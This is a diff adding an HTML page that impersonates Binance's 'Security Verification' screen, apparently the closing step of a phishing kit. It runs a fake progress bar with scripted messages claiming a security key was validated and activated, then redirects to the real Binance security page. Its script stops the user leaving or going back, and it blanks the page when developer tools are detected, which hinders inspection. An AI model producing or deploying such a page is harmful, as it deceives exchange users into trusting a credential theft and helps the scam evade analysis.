@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background: linear-gradient(135deg, #1e2329 0%, #2c3e4a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+        }
+        .logo {
+            width: 200px;
+            margin-bottom: 30px;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1e2329;
+            margin-bottom: 20px;
+        }
+        .message {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        .progress-container {
+            background: #f0f0f0;
+            border-radius: 20px;
+            height: 8px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #f0b90b 0%, #ffd700 100%);
+            width: 0%;
+            border-radius: 20px;
+            animation: loading 3s ease-in-out forwards;
+        }
+        @keyframes loading {
+            to { width: 100%; }
+        }
+        .status {
+            color: #f0b90b;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://public.bnbstatic.com/image/ufo/20210831/1e00bd49-0695-4eaa-8ab0-6dd89a7087fb.png" alt="Logo" class="logo">
+        
+        <div class="title">Security Verification</div>
+        <div class="message">
+            Your security key activation is being processed.<br>
+            Please wait while we verify your request.
+        </div>
+        
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+        
+        <div class="status" id="status">Initializing verification...</div>
+        
+        <div class="footer">
+            This process may take a few moments. Please do not close this window.
+        </div>
+    </div>
+
+    <script>
+        // Prevent navigation
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            return '';
+        });
+
+        // Block back button
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function() {
+            history.go(1);
+        });
+
+        // Status updates
+        const status = document.getElementById('status');
+        const messages = [
+            'Initializing verification...',
+            'Connecting to security servers...',
+            'Validating security key...',
+            'Processing activation request...',
+            'Finalizing verification...',
+            'Activation completed successfully!'
+        ];
+
+        let currentMessage = 0;
+        const updateStatus = () => {
+            if (currentMessage < messages.length) {
+                status.textContent = messages[currentMessage];
+                currentMessage++;
+                setTimeout(updateStatus, 600);
+            } else {
+                setTimeout(() => {
+                    window.location.href = 'https://www.binance.com/en/my/security';
+                }, 1000);
+            }
+        };
+
+        setTimeout(updateStatus, 500);
+
+        // Generate unique session
+        const sessionId = 'sess_' + Math.random().toString(36).substr(2, 16) + Date.now().toString(36);
+        console.log('Session ID:', sessionId);
+
+        // Block developer tools
+        let devtools = false;
+        setInterval(function() {
+            if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) {
+                if (!devtools) {
+                    devtools = true;
+                    console.clear();
+                    document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:Arial;">Access Restricted</div>';
+                }
+            }
+        }, 500);
+    </script>
+</body>
+</html>
